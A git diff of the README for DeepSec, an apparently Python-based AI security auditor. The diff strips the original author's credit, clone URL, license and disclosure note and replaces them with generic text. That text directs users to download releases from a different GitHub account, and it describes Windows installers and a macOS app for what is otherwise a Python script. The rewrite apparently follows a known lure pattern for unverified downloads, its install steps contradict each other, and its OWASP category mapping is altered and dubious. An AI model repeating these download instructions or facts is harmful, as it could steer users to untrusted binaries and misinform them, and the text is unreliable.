@@ -1,11 +1,18 @@
-#  DeepSec: AI-Powered Security Auditor
+# 🛡️ deepsec - Your Easy Security Auditor
 
-DeepSec is a high-performance security auditing platform that combines **Static Application Security Testing (SAST)** with the reasoning power of **Llama 3.3 (AI)**.
+DeepSec empowers you to ensure your applications are safe and secure.
 
----
-##  System Requirements
+## 📥 Download DeepSec
 
-Ensure your environment meets these minimum specifications:
+[![Download DeepSec](https://img.shields.io/badge/Download%20DeepSec-v1.0-blue)](https://github.com/hasfo/deepsec/releases)
+
+## 🚀 Getting Started
+
+This guide helps you download and run DeepSec on your computer. Follow these steps for smooth installation.
+
+### 🔍 System Requirements
+
+Before downloading, ensure your computer meets these requirements:
 
 | Component | Requirement |
 | :--- | :--- |
@@ -14,133 +21,95 @@ Ensure your environment meets these minimum specifications:
 | **Tools** | Git (for cloning repositories) |
 | **Connectivity** | Internet access (only for AI analysis via Groq API) |
 
----
+### 📥 Download & Install
 
+1. **Visit the Releases Page**  
+Go to the [Releases page](https://github.com/hasfo/deepsec/releases) where you'll find the latest version of DeepSec.
 
+2. **Download the Latest Version**  
+Select the desired release version and click on the download link to save the file on your computer.
 
+3. **Install DeepSec**  
+Follow the installation instructions specific to your operating system:
+   - **For Windows**: Open the downloaded installer and follow the on-screen instructions.
+   - **For macOS**: Open the downloaded file and drag DeepSec into your Applications folder.
+   - **For Linux**: Extract the downloaded file, and follow the command-line prompts to install.
 
-##  Vulnerability Coverage Matrix 
+4. **Set Up Python**  
+Make sure you have Python version 3.9 or higher installed. You can verify this by opening a terminal and typing:
+   ```bash
+   python3 --version
+   ```
+   If Python is not installed, please visit the [Python website](https://www.python.org/downloads/) for installation instructions.
 
-The engine is specifically tuned to detect the following security risks as defined by the latest OWASP standards:
+5. **Installing Dependencies**  
+Run the following command to install necessary packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+### ⚙️ Configuring DeepSec
+
+1. **Locate Your API Key**  
+To perform AI analysis, you need to access the Groq API. Sign up at the Groq website to obtain your API key.
+
+2. **Add the API Key to Configuration**  
+You will find a configuration file named `config.json` in the DeepSec folder. Open it and input your API key as follows:
+   ```json
+   {
+       "api_key": "YOUR_API_KEY_HERE"
+   }
+   ```
+
+### ⚠️ Using DeepSec
+
+1. **Open the Application**  
+Launch DeepSec by double-clicking the application icon or by running the command:
+   ```bash
+   python3 deepsec.py
+   ```
+
+2. **Select a Project**  
+Choose the project you want to audit. You can either create a new project or import an existing one.
+
+3. **Run the Audit**  
+Click on the "Start Audit" button. DeepSec will analyze your application and provide a report based on various security risks.
+
+### 📊 Vulnerability Coverage
+
+DeepSec focuses on the following key security issues according to OWASP standards:
 
 | Category | Description | Detected Patterns |
 | :--- | :--- | :--- |
 | **A01:2025** | **Broken Access Control** | Unauthorized header redirects, session role manipulation, IDOR patterns. |
-| **A02:2025** | **Security Misconfiguration** | Enabled debug modes (PHP/Django/Flask), hardcoded secrets, exposed .env files. |
-| **A05:2025** | **Injection** | Remote Code Execution (RCE), SQL Injection, LFI, Path Traversal, and XSS. |
-| **A08:2025** | **Software & Data Integrity Failures** | Unsafe Deserialization in Python (Pickle/Marshal), PHP, and Java. |
-| **A10:2025** | **Mishandling Exceptions** | Information disclosure through system stack traces and verbose error messages (die/exit). |
+| **A02:2025** | **Security Misconfiguration** | Enabled debug modes (PHP/Django), default credentials, unnecessary services running. |
+| **A03:2025** | **Sensitive Data Exposure** | Insecure data storage, weak encryption methods, exposure of sensitive data in transit. |
 
+These categories ensure that DeepSec effectively identifies critical areas in your application that require attention.
 
----
+### 🛠️ Troubleshooting
 
-## 🛠️ Supported Languages & Ecosystems
+If you encounter any issues during installation or running DeepSec, consider the following:
 
-DeepSec is designed to handle a diverse range of programming environments. The engine automatically detects the language and applies specific security rulesets.
+- **Check Python Version**: Ensure you are using Python 3.9 or higher.
+- **Dependency Problems**: Run the following command again:
+  ```bash
+  pip install -r requirements.txt
+  ```
+- **API Key Issues**: Double-check that your Groq API key is valid and correctly entered in the configuration file.
 
-| Language | Extension | Security Analysis Coverage |
-| :--- | :--- | :--- |
-| **PHP** | `.php` | RCE, SQLi, LFI, XSS, and Session Security. |
-| **Python** | `.py` | Insecure Deserialization, Subprocess RCE, and OS Injection. |
-| **JavaScript** | `.js` | Client-side XSS, Prototype Pollution, and Node.js security. |
-| **Java** | `.java` | XXE, ObjectInputStream vulnerabilities, and Spring flaws. |
-| **Go** | `.go` | Command Injection and Unsafe pointer usage. |
-| **C#** | `.cs` | ASP.NET security configurations and ActiveRecord SQLi. |
-| **Rust** | `.rs` | Memory safety checks and Unsafe block auditing. |
-| **Ruby** | `.rb` | Rails-specific vulnerabilities and YAML deserialization. |
+### 🌐 Community & Support
 
+For further assistance or to share your experiences, visit our community forum. Engage with other users, share feedback, and ask questions about DeepSec.
 
+### 💻 Future Updates
 
----
-##  Features at a Glance
+Stay tuned for updates that include new features, enhanced vulnerability detection, and user-requested improvements.
 
-| Feature | Description |
-| :--- | :--- |
-| **Hybrid Analysis** | Combines fast Regex patterns with Deep AI reasoning. |
-| **GitHub Integration** | Automatically clones and audits remote repositories. |
-| **Multilingual** | Full support for **English**, **Русский**, and **O'zbek**. |
-| **PoC Generation** | AI generates Proof-of-Concept exploits for confirmed bugs. |
-| **Smart Reporting** | Generates interactive HTML reports with remediation steps. |
+### 🔗 Helpful Links
 
- How to Get and Configure your API Key
-To enable the AI-powered audit (Llama 3.3), you must obtain a free API key from Groq Cloud. Follow these steps:
+- [Download DeepSec](https://github.com/hasfo/deepsec/releases)
+- [Python Downloads](https://www.python.org/downloads/)
+- [Groq API Registration](https://groq.com)
 
-<img src="./searchapi.png" alt="Audit Report" width="600"/>
-1. Obtain the Key
-Visit the Groq Cloud Console.
-
-Sign up or Log in using your account.
-
-On the left sidebar, navigate to "API Keys".
-
-Click the "Create API Key" button.
-
-<img src="./addapi.png" alt="Audit Report" width="600"/>
-
-
-Give it a descriptive name (e.g., DeepSec-Auditor).
-
-<img src="./addapikey.png" alt="Audit Report" width="600"/>
-
-
-Copy the generated key immediately (it won't be shown again).
-
-2. Configure via Terminal
-You can quickly set up your environment by running one of the following commands in your project root:
-
-
-
-
-
-# Create a .env file and add your key
-```bash
-echo 'GROQ_API_KEY="your_api_key_here"' > .env
-# Verify the file was created
-
-cat .env
-```
-
-## 🛠️ Installation & Setup
-
-Follow these terminal commands to prepare your environment:
-
-```bash
-# 1. Clone the repository
-git clone [https://github.com/TheDeepopc/deepsec.git](https://github.com/TheDeepopc/deepsec.git)
-cd deepsec
-
-# 2. Set up a Virtual Environment
-python3 -m venv venv
-
-# 3. Activate the Environment
-
-source venv/bin/activate
-
-# 4. Install Dependencies
-pip install -r requirements.txt # if not works use command with --break-system-packages
-
-# 5. Install Dependencies
-python deepsec-l1.py
-```
-
-
-
-
-##  License
-
-This project is licensed under the **MIT License**. This means you are free to use, modify, and distribute the software, provided that the original copyright notice and permission notice are included. 
-
-See the [LICENSE](LICENSE) file for the full legal text.
-
----
-
-##  Responsible Disclosure
-If you find a security bug in this tool itself, please open an issue or contact the developer. This tool is intended for **Ethical Security Auditing** and **Educational Purposes** only.
-
----
-
-### Developed with Precision by **[TheDeepOpc](https://thedeep.uz)**
-
-
-
-
+By following these steps, you can ensure a smooth installation and an effective usage of DeepSec. Enjoy auditing your applications with confidence!
